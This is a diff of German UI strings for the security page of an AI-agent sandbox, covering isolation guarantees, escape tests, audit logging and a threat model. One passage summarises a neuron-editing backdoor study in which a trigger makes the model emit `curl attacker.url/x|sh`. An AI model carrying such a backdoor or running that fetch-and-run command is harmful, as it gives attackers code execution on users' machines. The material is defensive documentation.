+        'Der Weg einer Anfrage in sieben Stationen. Der Agent sitzt im Kasten, direkte Versuche enden an den Wänden, und die einzige Tür führt zum Proxy. Der Kernel verweigert weitere Socket-Familien. Der Proxy hält die Anfrage, bis der Mensch sie zulässt; erst dann wird der Name aufgelöst und die Anfrage aufgezeichnet. Daneben liegen zwei erklärte Wege: der LLM-Host ohne Halt und der geteilte Projektordner.',
       fig: {
         work: '/work · geteilt',
         llm: 'LLM-Host · erklärt · aufgezeichnet · ohne Halt',
@@ -585,17 +585,17 @@ const de = {
       checkLabel: 'Prüfung',
       termCaption: 'macOS, CI des Projekts, gekürzt',
       manualTitle: 'Von Hand unter Linux, in der Sandbox',
-      shimTitle: 'Zeilenformat des Shims, wie seine Tests es erwarten, keine Live-Ausgabe',
+      shimTitle: 'Zeilenformat des Shims, wie es seine Tests erwarten; keine Live-Ausgabe',
       probesTitle: 'Ausbruchsproben',
       macTitle: 'Unter macOS',
       items: [
         {
           title: 'Keine Netzwerkschnittstelle. Der Verkehr hat kein Ziel.',
           mechanism:
-            'Ein leerer Netz-Namespace mit nur `lo`. Unter bubblewrap `--cap-drop ALL` und `--disable-userns`, unter Podman `--network=none`, `--cap-drop=all` und `no-new-privileges`: kein `CAP_NET_ADMIN`, kein neues Gerät. Auch abstrakte Unix-Sockets bleiben im leeren Namespace.',
+            'Ein leerer Netz-Namespace, der nur `lo` enthält. Unter bubblewrap `--cap-drop ALL` und `--disable-userns`, unter Podman `--network=none`, `--cap-drop=all` und `no-new-privileges`: kein `CAP_NET_ADMIN`, kein neues Gerät. Auch abstrakte Unix-Sockets bleiben im leeren Namespace.',
           manual: ['nur lo', 'leer', 'nur Kopfzeile', '`Current: =`'],
           note: '',
-          mac: 'Hier heißt der Satz „kein Weg nach draußen“. Die Interfaces existieren, aber das Profil lässt `connect`, `bind` und `sendto` außer zur Tür mit `EPERM` enden, und es gibt keine Namensauflösung. Gemessen: TCP zu einer öffentlichen IPv4- und IPv6-Adresse und ein UDP-Datagramm, alle verweigert.',
+          mac: 'Hier lautet der Satz „kein Weg nach draußen“. Die Interfaces existieren, aber das Profil lässt `connect`, `bind` und `sendto` mit `EPERM` enden, außer zur Tür. Eine Namensauflösung gibt es nicht. Gemessen: TCP zu einer öffentlichen IPv4- und einer IPv6-Adresse sowie ein UDP-Datagramm, alle verweigert.',
           src: [
             { label: 'SECURITY.md §2', href: '/docs/security/#2-guarantee-1-no-network-interface' },
             { label: '§12', href: '/docs/security/#12-macos-seatbelt-instead-of-bubblewrap' },
@@ -605,7 +605,7 @@ const de = {
         {
           title: 'Genau eine Tür: ein Socket, der zu Humanitl führt.',
           mechanism:
-            'Eingebunden wird die Socket-Datei, nie ihr Verzeichnis. Alles andere ist eine Positivliste; eine Sperrliste weist `$XDG_RUNTIME_DIR`, `/run`, `/home`, `~/.ssh`, X11, Wayland, D-Bus und Docker mit `SANDBOX_006` ab. Es gibt kein `/etc/resolv.conf`, und unter bubblewrap sind Projektordner und Zusatz-Mounts per Deskriptor festgenagelt. Podman bindet über den Pfad ein; der Shim vergleicht nach dem Einhängen Gerät und Inode, und ein vertauschter Ordner lässt den Start mit `SANDBOX_042` scheitern, bevor es den Agenten gibt.',
+            'Eingebunden wird die Socket-Datei, nie ihr Verzeichnis. Alles Weitere steht auf einer Positivliste; eine Sperrliste weist `$XDG_RUNTIME_DIR`, `/run`, `/home`, `~/.ssh`, X11, Wayland, D-Bus und Docker mit `SANDBOX_006` ab. Es gibt kein `/etc/resolv.conf`, und unter bubblewrap sind Projektordner und Zusatz-Mounts per Deskriptor festgenagelt. Podman bindet über den Pfad ein. Der Shim vergleicht nach dem Einhängen Gerät und Inode; ein vertauschter Ordner lässt den Start mit `SANDBOX_042` scheitern, bevor der Agent überhaupt startet.',
           manual: ['genau eine Zeile: `/run/humanitl/proxy.sock`', '`sandbox`'],
           note: '`-xtype s`, weil bwrap den Socket über eine leere Datei bindet; kein `-xdev`, weil `/work`, `/tmp`, `/dev/shm` und `/home/agent` eigene Mounts sind.',
           mac: 'Erlaubt sind der Proxy-Socket des Daemons, der Loopback-Port der Sitzung und ein zweiter, zufälliger Port für den eigenen Server des Agenten. Gemessen: Die Tür antwortet, `/var/run/syslog` und ein fremder Loopback-Port nicht.',
@@ -620,7 +620,7 @@ const de = {
             'Jeder Prozess im Kasten trägt einen Filter. Der Shim ist PID 1 und nicht dumpbar; das Kind setzt `PR_SET_NO_NEW_PRIVS`, lädt den Filter und startet erst dann den Agenten. Eine falsche Architektur beendet den Prozess.',
           manual: ['`Seccomp: 2`'],
           note: '',
-          mac: 'Hier heißt der Satz „Der Kernel hält den Prozess am Profil“. `sandbox_check(getpid())` meldet den Prozess als eingeschränkt; `AF_ROUTE`, `AF_SYSTEM` und `AF_NDRV` enden mit `EPERM`. Auch `AF_INET SOCK_RAW` endet mit `EPERM`, das bekommt aber jeder unprivilegierte Prozess ohnehin; es bleibt nur als Untergrenze in der Prüfung.',
+          mac: 'Hier lautet der Satz „Der Kernel hält den Prozess am Profil“. `sandbox_check(getpid())` meldet den Prozess als eingeschränkt; `AF_ROUTE`, `AF_SYSTEM` und `AF_NDRV` enden mit `EPERM`. Auch `AF_INET SOCK_RAW` endet mit `EPERM`, doch das gilt ohnehin für jeden unprivilegierten Prozess. Es steht nur als Untergrenze in der Prüfung.',
           src: [
             { label: 'SECURITY.md §4', href: '/docs/security/#4-guarantee-3-no-new-doors' },
             { label: 'esc-1-sockets.sh', href: 'gh:tests/escape' },
@@ -649,11 +649,11 @@ const de = {
       },
       visible: {
         title: 'Sichtbar gemacht',
-        text: 'Verweigerte `socket()`-Aufrufe zählt der Shim je Familie und Typ und zeigt sie im Isolations-Tab der App. Das ist ein Bericht, keine Garantie: Ein Angreifer kann eigene Filter vorschalten, verweigert wird trotzdem. `connect()` nach draußen erscheint dort nicht, es endet mit `ENETUNREACH`.',
+        text: 'Verweigerte `socket()`-Aufrufe zählt der Shim je Familie und Typ und zeigt sie im Isolations-Tab der App. Das ist ein Bericht, keine Garantie: Ein Angreifer kann Versuche hinter einem eigenen, vorgeschalteten Filter verbergen; verweigert wird der Aufruf trotzdem. `connect()` nach draußen erscheint dort nicht; es endet mit `ENETUNREACH`.',
       },
       together: {
         title: 'Zusammen, nicht allein',
-        text: 'Seccomp erlaubt TCP, der leere Namespace macht es nutzlos; die Tür ist nur deshalb die einzige, weil der Kernel keine neue öffnet. Fällt eine Prüfung, wird die Sitzung gestoppt, Zustand `failed`. Ein „trotzdem starten“ gibt es nicht. Die CLI endet mit Exit-Code 3 und dem Befund der ersten fehlgeschlagenen Prüfung.',
+        text: 'Seccomp erlaubt TCP, aber der leere Namespace macht es nutzlos. Und die Tür ist nur deshalb die einzige, weil der Kernel keine neue öffnet. Schlägt eine Prüfung fehl, wird die Sitzung gestoppt, mit dem Zustand `failed`. Ein „Trotzdem starten“ gibt es nicht. Die CLI endet mit Exit-Code 3 und nennt den Befund der ersten fehlgeschlagenen Prüfung.',
         src: [
           { label: 'SECURITY.md §9', href: '/docs/security/#9-what-we-verify-in-ci' },
           { label: 'Installationsanleitung', href: '/docs/guides/install/' },
@@ -671,7 +671,7 @@ const de = {
       ways: [
         { title: 'Die Startzeile', text: 'Die genaue Startzeile. In der App unter Sandbox, Isolation, „Befehlszeile zeigen“.' },
         { title: 'Die drei Prüfungen', text: 'Alle drei Garantien in einer kurzlebigen Sandbox. In der App als Isolationsring.' },
-        { title: 'Die Ausbruchstests', text: 'Die Ausbruchsversuche, die jeder Commit über sich ergehen lässt.' },
+        { title: 'Die Ausbruchstests', text: 'Die Ausbruchsversuche, die jeder Commit durchläuft.' },
       ],
       termCaption: 'macOS, CI des Projekts, gekürzt',
       formatTitle: 'Linux: Format der Evidenzspalte',
@@ -679,7 +679,7 @@ const de = {
       formatNote: 'Format, keine aufgezeichnete Ausgabe.',
       windowTitle: 'Das Fenster nach dem Start',
       window:
-        'Die Prüfungen laufen, nachdem der Agent gestartet ist, mit einer Obergrenze von 10 s im Daemon und 15 s bei `sandbox run`. Eine rote Prüfung stoppt die Sitzung, sie verhindert sie nicht. Im Bedrohungsmodell ist dieses Fenster als offen geführt (K-15).',
+        'Die Prüfungen laufen, nachdem der Agent gestartet ist, mit einer Obergrenze von 10 s im Daemon und 15 s bei `sandbox run`. Eine rote Prüfung stoppt die Sitzung; verhindern kann sie die Sitzung nicht. Das Bedrohungsmodell führt dieses Fenster als offen (K-15).',
       src: [
         { label: 'SECURITY.md §9', href: '/docs/security/#9-what-we-verify-in-ci' },
         { label: 'SECURITY.md §4', href: '/docs/security/#4-guarantee-3-no-new-doors' },
@@ -689,18 +689,18 @@ const de = {
     tests: {
       eyebrow: 'Kapitel 5',
       title: 'Jeder Commit versucht auszubrechen',
-      lede: 'Die Proben sind echte Versuche, kein Durchsehen der Konfiguration. Kommt eine durch, ist der Build rot.',
+      lede: 'Die Proben sind echte Versuche, keine Durchsicht der Konfiguration. Kommt eine durch, ist der Build rot.',
       suites: [
         { title: 'Sockets', where: 'im Kasten, rund 40 Proben', more: 'und weitere' },
         { title: 'Mounts', where: 'im Kasten', more: 'und weitere' },
-        { title: 'Egress', where: 'im Kasten plus Beobachter auf dem Host', more: 'DNS-Proben gegen einen aufzeichnenden Nameserver' },
+        { title: 'Egress', where: 'im Kasten, dazu ein Beobachter auf dem Host', more: 'DNS-Proben gegen einen aufzeichnenden Nameserver' },
         {
           title: 'Regeln',
           where: 'Host',
-          more: 'Regeltabelle, Homographen, IP-Literale, WebSocket, unbekannte Methoden fragen; 15 Fälle über `humanitl rules test`.',
+          more: 'Regeltabelle, Homographen, IP-Literale, WebSocket, Rückfrage bei unbekannten Methoden; 15 Fälle über `humanitl rules test`.',
         },
         { title: 'Dateisystem und Audit', where: 'Host', more: '' },
-        { title: 'macOS', where: 'Daemon in leerem Home', more: '' },
+        { title: 'macOS', where: 'Daemon in einem leeren Home', more: '' },
       ],
       groups: ['Netz', 'Lesen', 'Schreiben', 'Masken und Terminal'],
       mustWork: 'Muss gehen',
@@ -711,15 +711,15 @@ const de = {
       runs: [
         'CI-Job `escape-tests` auf ubuntu-24.04, auf jedem Issue-Branch und auf main; eine rote Probe bricht den Build.',
         '`rust-test` verlangt drei grüne Zeilen von `humanitl sandbox check`.',
-        'Job `macos` auf macos-15 bei jedem Commit, vor jedem Release `check-macos` gegen die Binaries in der .dmg.',
+        'Job `macos` auf macos-15 bei jedem Commit, dazu vor jedem Release `check-macos` gegen die Binaries in der .dmg.',
         'Lokal: `make escape`.',
       ],
       exitCodes:
-        'Exit-Code 1: eine Probe kam durch. Exit-Code 2: die Sandbox startete nicht, eine Aussage über die Maschine, nicht über die Garantie.',
+        'Exit-Code 1: Eine Probe kam durch. Exit-Code 2: Die Sandbox startete nicht. Das ist eine Aussage über die Maschine, nicht über die Garantie.',
       honest:
-        'Linux-Releases fahren die Suite nicht erneut. Sie verlangen einen grünen CI-Lauf des getaggten Commits, und der enthält `escape-tests`.',
+        'Für Linux-Releases läuft die Suite nicht noch einmal. Sie setzen einen grünen CI-Lauf des getaggten Commits voraus, und der enthält `escape-tests`.',
       alsoTitle: 'Auch in der CI',
-      also: 'Konformitätsmatrix echter Clients, Gegendrucktest mit 1000 Flüssen in 10 s, Shim statisch und unter 2 MB, nächtliches Fuzzing.',
+      also: 'Konformitätsmatrix mit echten Clients, Gegendrucktest mit 1000 Flüssen in 10 s, statischer Shim unter 2 MB, nächtliches Fuzzing.',
       src: [
         { label: 'SECURITY.md §9', href: '/docs/security/#9-what-we-verify-in-ci' },
         { label: 'tests/escape', href: 'gh:tests/escape' },
@@ -729,7 +729,7 @@ const de = {
     audit: {
       eyebrow: 'Kapitel 6',
       title: 'Was war, bleibt nachprüfbar',
-      lede: '`audit.jsonl` speichert eine kanonische JSON-Zeile je Ereignis, mit `seq`, `ts`, `session`, `kind`, `data`, `prev` und `hash`, versiegelt mit HMAC-SHA256. Alle 100 Einträge und beim Stopp des Daemons kommt ein Anker in die Datei und in die Tabelle `audit_anchors` von `humanitl.db`.',
+      lede: '`audit.jsonl` speichert eine kanonische JSON-Zeile je Ereignis, mit `seq`, `ts`, `session`, `kind`, `data`, `prev` und `hash`, versiegelt mit HMAC-SHA256. Nach je 100 Einträgen und beim Beenden des Daemons wird ein Anker in die Datei und in die Tabelle `audit_anchors` von `humanitl.db` geschrieben.',
       example: 'Beispielwerte',
       anchor: 'Anker',
       tail: 'nach dem letzten Anker: Abschneiden nicht erkennbar',
@@ -739,26 +739,26 @@ const de = {
       tamperOn: 'Eintrag 0099 geändert: Er passt nicht mehr zur Kette und zum Anker.',
       tamperOff: 'Kette unverändert.',
       tamperText:
-        'Eine geänderte Zeile passt nicht mehr zur Kette und zum Anker in der Datenbank. Wer beides ändert, braucht zusätzlich den Schlüssel.',
+        'Eine geänderte Zeile passt nicht mehr zur Kette und zum Anker in der Datenbank. Wer beides ändern will, braucht zusätzlich den Schlüssel.',
       provesTitle: 'Beweist',
       proves:
-        'Kein Eintrag bis zum letzten Anker wurde geändert, entfernt oder umsortiert, ohne dass `verify` es meldet, es sei denn, der Angreifer hat den HMAC-Schlüssel.',
+        'Kein Eintrag bis zum letzten Anker wurde geändert, entfernt oder umsortiert, ohne dass `verify` es meldet. Das gilt nicht, wenn der Angreifer den HMAC-Schlüssel hat.',
       notTitle: 'Beweist nicht',
       not: [
         'dass der Daemon ehrlich geschrieben hat',
-        'dass nie geschriebene Ereignisse nicht fehlen',
+        'dass kein Ereignis fehlt, das nie geschrieben wurde',
         'dass das Ende nach dem letzten Anker nicht abgeschnitten wurde',
-        'irgendetwas gegen jemanden mit dem Schlüssel; ein Prozess desselben Kontos kann Kette und Anker neu bauen',
+        'irgendetwas gegen jemanden mit dem Schlüssel; ein Prozess desselben Kontos kann Kette und Anker neu aufbauen',
       ],
       external: 'Externe Verankerung kommt nach dem MVP.',
       notInLogTitle: 'Nicht im Log',
       notInLog:
-        'Bodies, Header, Fundwerte und Block-Notizen stehen nicht darin. Der Pfad nur als SHA-256, der Host im Klartext.',
+        'Bodys, Header, Fundwerte und Block-Notizen stehen nicht darin. Der Pfad steht nur als SHA-256 darin, der Host im Klartext.',
       commandsTitle: 'Befehle',
       commands: [
-        'Daemon prüft mit Schlüssel und Ankern',
-        'nur die Kette, und sagt es: `no HMAC key (file mode)`, `no anchors (file mode)`',
-        'prüft nichts',
+        'Der Daemon prüft mit Schlüssel und Ankern.',
+        'Prüft nur die Kette und sagt das: `no HMAC key (file mode)`, `no anchors (file mode)`',
+        'Prüft nichts.',
       ],
       testsTitle: 'Tests',
       testsNote: 'Grenze 3 ist durch einen eigenen Test dokumentiert.',
@@ -770,7 +770,7 @@ const de = {
       lede: 'Ein Sicherheitsversprechen, das seine Ausnahmen versteckt, ist keins.',
       figTitle: 'Die Kanäle der Sandbox',
       figDesc:
-        'Der Kasten mit dem Agenten. Die eine Tür führt zur Schleuse, wo Anfragen gehalten werden. Erklärt und offen sind zwei Wege: die LLM-Bahn zum LLM-Host ohne Halt und der geteilte Projektordner /work, dessen Inhalt ein Mensch hinaustragen kann. Terminalausgabe, Hostnamen und Caches tragen keinen neuen Datenweg.',
+        'Der Kasten mit dem Agenten. Die eine Tür führt zur Schleuse, wo Anfragen gehalten werden. Zwei Wege sind erklärt und offen: die LLM-Bahn zum LLM-Host ohne Halt und der geteilte Projektordner /work, dessen Inhalt ein Mensch hinaustragen kann. Terminalausgabe, Hostnamen und Caches öffnen keinen neuen Datenweg.',
       fig: {
         held: 'gehalten',
         llmHost: 'LLM-Host',
@@ -783,22 +783,22 @@ const de = {
       openTitle: 'Offene Datenwege',
       llm: {
         title: 'LLM-Passthrough',
-        text: 'Eine Regel, kein Loch im Filter: genau ein Host, ein Port, ein Schema, nur POST und GET. Standardmäßig werden `/v1/` und `/api/` zu 13 exakten Endpunkten für Inferenz und Info, `/api/pull` oder `/v1/files` werden also gehalten; ein Pfad, den du selbst in `llm.passthrough_paths` einträgst, bleibt ein Präfix und deckt alles darunter. Pfade mit `..` passen nie. Alles wird aufgezeichnet und auf Geheimnisse gescannt. Steht im Endpunkt ein Name statt einer Adresse, entscheidet der Resolver bei jeder Anfrage neu, wohin er führt, auch auf den Router oder `169.254.169.254`; besser eine IP oder `resolver.overrides`. Das Modell sieht jeden Prompt ohne Halt; der LLM-Host gehört zu dem, dem du vertraust.',
+        text: 'Eine Regel, kein Loch im Filter: genau ein Host, ein Port, ein Schema, nur POST und GET. Standardmäßig werden `/v1/` und `/api/` zu 13 exakten Endpunkten für Inferenz und Info erweitert; `/api/pull` oder `/v1/files` werden also gehalten. Ein Pfad, den du selbst in `llm.passthrough_paths` einträgst, bleibt dagegen ein Präfix und deckt alles darunter ab. Pfade mit `..` passen nie. Alles wird aufgezeichnet und auf Geheimnisse gescannt. Steht im Endpunkt ein Name statt einer Adresse, entscheidet der Resolver bei jeder Anfrage neu, wohin er führt, auch auf den Router oder `169.254.169.254`. Nimm besser eine IP-Adresse oder `resolver.overrides`. Das Modell sieht jeden Prompt ohne Halt; der LLM-Host gehört zu dem, dem du vertraust.',
         src: { label: 'SECURITY.md §5.1', href: '/docs/security/#51-the-llm-passthrough' },
       },
       work: {
         title: 'Der Projektordner /work',
-        text: 'Nur ein Unterpfad, nie `$HOME`, auf Wunsch nur lesbar. Standardmäßig maskiert sind unter anderem `.git/hooks`, `.github/workflows`, `.vscode`, `.env`, `.envrc`, `.git/config` und `.npmrc`. Ein Profil kann eine Maske mit `mounts.unmask` aufheben, was beim Start `SANDBOX_020` meldet; `.envrc` und `.git/config` lassen sich nicht freigeben. Eine Maske greift nur, wo der Pfad im Projekt existiert; fehlende Pfade nennt die Zusammenfassung, und Schreiben dort meldet `SANDBOX_025`. Was im Ordner liegt, kann später ein Mensch hinaustragen; die Sitzungszusammenfassung listet berührte Dateien, Symlinks nach außen und einen Geheimnis-Scan.',
+        text: 'Nur ein Unterpfad, nie `$HOME`, auf Wunsch schreibgeschützt. Standardmäßig maskiert sind unter anderem `.git/hooks`, `.github/workflows`, `.vscode`, `.env`, `.envrc`, `.git/config` und `.npmrc`. Ein Profil kann eine Maske mit `mounts.unmask` aufheben; der Start meldet das mit `SANDBOX_020`. Bei `.envrc` und `.git/config` lässt sich die Maske nicht aufheben. Eine Maske greift nur, wo der Pfad im Projekt existiert. Fehlende Pfade nennt die Zusammenfassung, und hat der Agent dort geschrieben, meldet das `SANDBOX_025`. Was im Ordner liegt, kann später ein Mensch hinaustragen. Die Sitzungszusammenfassung listet berührte Dateien und Symlinks nach außen und enthält einen Geheimnis-Scan.',
         src: { label: 'SECURITY.md §5.2', href: '/docs/security/#52-the-project-directory-work' },
       },
       quietTitle: 'Ohne neuen Datenweg',
       quiet: [
-        'Terminalausgabe, gefiltert, nicht vertraut',
-        'Hostnamen im Klartext in Aufzeichnung und Export',
-        'Paket-Caches je Projekt, tragen Daten zwischen Sitzungen',
+        'Terminalausgabe: gefiltert, nicht vertrauenswürdig',
+        'Hostnamen: im Klartext in Aufzeichnung und Export',
+        'Paket-Caches: je Projekt, tragen Daten von Sitzung zu Sitzung',
       ],
       classifier: 'Du bist der Klassifikator.',
-      classifierNote: 'Eine freigegebene Anfrage geht raus. Ein Base64-Body an api.github.com sieht legitim aus.',
+      classifierNote: 'Eine freigegebene Anfrage geht hinaus. Ein Base64-Body an api.github.com sieht legitim aus.',
       classifierSrc: [
         { label: 'README.md', href: '/docs/security/#5-declared-side-channels' },
         { label: 'THREAT-MODEL.md', href: '/docs/threat-model/' },
@@ -820,9 +820,9 @@ const de = {
       moreSrc: { label: 'SECURITY.md §5.6', href: '/docs/security/#56-other-known-limits' },
       model: {
         title: 'Das manipulierte Modell als Gegner',
-        text: 'Forschende von Microsoft Research und dem Microsoft AI Red Team haben in Nemotron-Terminal-8B sieben von über 12.000 Neuronen im letzten Feed-Forward-Block umgeschrieben, ohne Training. In ihrem Versuch enthielten die Vorhersagen des Modells, sobald der Auslöser im Kontext stand, in mindestens 98,8 % der ausgelösten Testläufe die Testnutzlast `printf LAZARUS_OK`, auf den geprüften normalen Eingaben kein einziges Mal; Qwen3.6-27B und Gemma-4-31B-IT sind laut den Autoren ebenso angreifbar. Als Beispiel für den Ernstfall nennen sie `curl attacker.url/x|sh`, ausgelöst durch `2027-01-01` im Terminal, das beliebigen Code nachlädt und ausführt. Ihr Fazit: „the scale of the attack is bounded by the agent’s permissions, not the size of the edit“. Anwendern empfehlen sie, die Rechte des Agenten zu begrenzen, Befehle, Dateiänderungen und Netzaufrufe zu protokollieren und vor Befehlen, Änderungen und Daten nach außen eine Freigabe zu verlangen.',
+        text: 'Forschende von Microsoft Research und dem Microsoft AI Red Team haben in Nemotron-Terminal-8B sieben von über 12.000 Neuronen im letzten Feed-Forward-Block umgeschrieben, ohne Training. Sobald der Auslöser im Kontext stand, enthielten die Vorhersagen des Modells in mindestens 98,8 % der ausgelösten Testläufe die Testnutzlast `printf LAZARUS_OK`. Bei den geprüften normalen Eingaben kam sie kein einziges Mal vor. Laut den Autoren sind Qwen3.6-27B und Gemma-4-31B-IT ebenso angreifbar. Als Beispiel für den Ernstfall nennen sie `curl attacker.url/x|sh`, ausgelöst durch `2027-01-01` im Terminal: Der Befehl lädt beliebigen Code nach und führt ihn aus. Ihr Fazit: „the scale of the attack is bounded by the agent’s permissions, not the size of the edit“. Für den Einsatz empfehlen sie, die Rechte des Agenten zu begrenzen, Befehle, Dateiänderungen und Netzaufrufe zu protokollieren und eine Freigabe zu verlangen, bevor Befehle laufen, Dateien geändert oder Daten nach außen geschickt werden.',
         humanitl:
-          'Davon deckt Humanitl die Grenze und den Netzweg ab: Dein Home-Verzeichnis liegt außerhalb der Sandbox; solange das Abfangen läuft, wird jede Anfrage, über die keine Regel entscheidet, gehalten, bis du sie freigibst; und der Verkehr wird aufgezeichnet, solange die Aufzeichnung läuft; fällt sie aus, sagt Humanitl es dir. Der erklärte LLM-Host ist die Ausnahme ohne Halt. Einzelne Befehle und Dateiänderungen gibt Humanitl nicht frei. Der Angriff setzt Schreibzugriff auf die Gewichte voraus, etwa über einen manipulierten Checkpoint auf einem öffentlichen Hub oder einen Insider; laut Microsoft Threat Intelligence wurde er bisher nicht in freier Wildbahn beobachtet. Humanitl erkennt die Manipulation nicht. Es begrenzt, was sie anrichten kann.',
+          'Davon deckt Humanitl die Grenze und den Netzweg ab. Dein Home-Verzeichnis liegt außerhalb der Sandbox. Solange das Abfangen läuft, wird jede Anfrage, über die keine Regel entscheidet, gehalten, bis du sie freigibst. Der Verkehr wird aufgezeichnet, solange die Aufzeichnung läuft; fällt sie aus, sagt Humanitl es dir. Der erklärte LLM-Host ist die Ausnahme ohne Halt. Eine Freigabe einzelner Befehle oder Dateiänderungen bietet Humanitl nicht. Der Angriff setzt Schreibzugriff auf die Gewichte voraus, etwa über einen manipulierten Checkpoint auf einem öffentlichen Hub oder über einen Insider. Laut Microsoft Threat Intelligence wurde er bisher nicht in freier Wildbahn beobachtet. Humanitl erkennt die Manipulation nicht. Es begrenzt aber, was sie anrichten kann.',
         src: [
           { label: 'Zeng et al. 2026 (PDF)', href: 'https://github.com/anadim/anadim.github.io/blob/master/papers/Lazarus.pdf' },
           {
@@ -839,16 +839,16 @@ const de = {
       whoLead: 'Der Angreifer ist immer Code, der als der Agent läuft:',
       attackers: [
         'Prompt-Injection über geladene Inhalte',
-        'bösartige Abhängigkeit',
-        'kompromittiertes Modell, das unangenehmste, weil der Modellkanal offen ist',
-        'lokaler Leser der Aufzeichnung',
+        'eine bösartige Abhängigkeit',
+        'ein kompromittiertes Modell, der unangenehmste Fall, weil der Modellkanal offen ist',
+        'ein lokaler Leser der Aufzeichnung',
       ],
       boundariesTitle: 'Vertrauensgrenzen',
       boundaries: [
-        'Sandbox zum Host, der Kernel',
-        'die eine Tür, jedes Byte geparst in speichersicherem Rust',
-        'Daemon zum Netz, erst nach Zulassen',
-        '`/work`, mit Absicht geteilt',
+        'zwischen Sandbox und Host: der Kernel',
+        'die eine Tür: jedes Byte in speichersicherem Rust geparst',
+        'zwischen Daemon und Netz: erst nach dem Zulassen',
+        '`/work`: mit Absicht geteilt',
       ],
       protectedTitle: 'Geschützt',
       protected:
@@ -857,7 +857,7 @@ const de = {
       out: 'Root- und Kernel-Exploits, physischer Zugriff, manipulierte Pakete, der freigebende Mensch, der LLM-Host, was über `/work` abfließt, Mikroarchitektur- und Timing-Seitenkanäle, Verfügbarkeit, andere Prozesse desselben Kontos, Netzangriffe auf den Host.',
       tcbTitle: 'Vertraute Rechenbasis',
       tcbNote:
-        'Die App gehört nicht zur Isolation, ihr wird aber die Entscheidung anvertraut; Bodies zeigt sie als Text, nie in einer Web-Ansicht.',
+        'Die App gehört nicht zur Isolation, ihr wird aber die Entscheidung anvertraut; Bodys zeigt sie als Text, nie in einer Web-Ansicht.',
       src: [
         { label: 'THREAT-MODEL.md', href: '/docs/threat-model/' },
         { label: 'SECURITY.md §5', href: '/docs/security/#5-declared-side-channels' },
@@ -866,14 +866,14 @@ const de = {
     macos: {
       eyebrow: 'Kapitel 8',
       title: 'macOS: ehrlich anders',
-      lede: 'Unter macOS sperrt Seatbelt den Agenten ein: ein erzeugtes SBPL-Profil je Sitzung, gestartet mit `/usr/bin/sandbox-exec`. Der Kernel hält den Shim und jedes Kind am Profil, kein Kind kann es ablegen, und was nicht erlaubt ist, ist verboten.',
+      lede: 'Unter macOS sperrt Seatbelt den Agenten ein: ein erzeugtes SBPL-Profil je Sitzung, gestartet mit `/usr/bin/sandbox-exec`. Der Kernel hält den Shim und jeden Kindprozess am Profil, kein Kindprozess kann es ablegen. Was nicht erlaubt ist, ist verboten.',
       src: [
         { label: 'ADR-0019', href: '/docs/adr/0019-seatbelt-on-macos/' },
         { label: 'SECURITY.md §12', href: '/docs/security/#12-macos-seatbelt-instead-of-bubblewrap' },
       ],
       figTitle: 'Linux und macOS nebeneinander',
       figDesc:
-        'Links der Linux-Kasten: innen nur lo, massive Wand, Tür proxy.sock. Rechts der macOS-Kasten: Die Interfaces en0 und lo0 existieren, aber das Profil verweigert sie; die Tür ist ein Loopback-Port, den auch ein anderer lokaler Prozess erreichen kann.',
+        'Links der Linux-Kasten: innen nur lo, eine massive Wand, die Tür ist proxy.sock. Rechts der macOS-Kasten: Die Interfaces en0 und lo0 existieren, aber das Profil verweigert sie; die Tür ist ein Loopback-Port, den auch ein anderer lokaler Prozess erreichen kann.',
       fig: { other: 'anderer lokaler Prozess', deny: 'deny' },
       compareTitle: 'Die drei Sätze im Vergleich',
       rows: [
@@ -890,25 +890,25 @@ const de = {
         {
           id: 'K-19',
           title: 'Geteiltes Loopback',
-          text: 'Jeder lokale Prozess, auch anderer Konten, erreicht die Tür und sendet mit den Regeln der Sitzung. Was allow oder Passthrough trifft, geht ohne Halt; alles andere wird gehalten, als käme es vom Agenten. Dafür erreicht der Agent keinen anderen Loopback-Port.',
+          text: 'Jeder lokale Prozess, auch unter einem anderen Konto, erreicht die Tür und sendet mit den Regeln der Sitzung. Was eine allow-Regel oder den Passthrough trifft, geht ohne Halt hinaus; alles andere wird gehalten, als käme es vom Agenten. Umgekehrt erreicht der Agent keinen Loopback-Port außer den beiden seiner Sitzung.',
           advice: 'Behebung geplant: HUM-331.',
         },
         {
           id: 'K-20',
           title: 'Kein PID-Namespace',
-          text: 'Der Shim beendet die Prozesse der Sitzung in Durchgängen, nach bestem Bemühen. Ein Prozess, der `setsid` ruft, überlebt die Sandbox und behält Zugang zum Proxy-Socket, solange der Daemon läuft.',
-          advice: 'Nach einer nicht vertrauenswürdigen Sitzung `humanitl daemon restart`. Behebung geplant: HUM-331.',
+          text: 'Der Shim beendet die Prozesse der Sitzung in mehreren Durchgängen, so gut es geht. Ein Prozess, der `setsid` aufruft, überlebt die Sandbox und behält Zugang zum Proxy-Socket, solange der Daemon läuft.',
+          advice: 'Führe nach einer nicht vertrauenswürdigen Sitzung `humanitl daemon restart` aus. Behebung geplant: HUM-331.',
         },
         {
           id: 'K-21',
           title: 'Lesen per Sperrliste',
-          text: '`/etc`, `/Library`, `/Applications`, `/opt/homebrew` und `/usr/local/etc` sind lesbar. Ein Zugangsdatum dort kann ohne Halt über den LLM-Passthrough gehen. Der Projektordner ist nicht per Deskriptor festgenagelt.',
-          advice: 'Geheimnisse ins Home-Verzeichnis legen.',
+          text: '`/etc`, `/Library`, `/Applications`, `/opt/homebrew` und `/usr/local/etc` sind lesbar. Liegen dort Zugangsdaten, können sie ohne Halt über den LLM-Passthrough hinausgehen. Der Projektordner ist nicht per Deskriptor festgenagelt.',
+          advice: 'Leg Geheimnisse in dein Home-Verzeichnis.',
         },
         {
           id: 'K-22',
           title: 'Seatbelt ist abgekündigt',
-          text: 'Apple führt Seatbelt als veraltet und dokumentiert die Profilsprache nur über Beispiele. Getestet wird auf den macos-15-Runnern und während der Entwicklung auf macOS 27, andere Versionen nicht.',
+          text: 'Apple führt Seatbelt als veraltet und dokumentiert die Profilsprache nur anhand von Beispielen. Getestet wird auf den macos-15-Runnern und während der Entwicklung auf macOS 27, andere Versionen werden nicht getestet.',
           advice: 'Deshalb misst der Shim die Garantien bei jedem Start, und ein rotes Ergebnis stoppt die Sitzung.',
         },
         {
@@ -923,7 +923,7 @@ const de = {
     },
     closing: {
       title: 'Lies es nach',
-      text: 'Jede Aussage auf dieser Seite steht in den Dokumenten, die Garantien auch in den Tests. Und auf deinem Rechner:',
+      text: 'Jede Aussage auf dieser Seite steht in den Dokumenten, die Garantien zusätzlich in den Tests. Und auf deinem Rechner:',
       download: 'Humanitl herunterladen',
       tests: 'tests/escape auf GitHub',
       home: 'Zur Startseite',
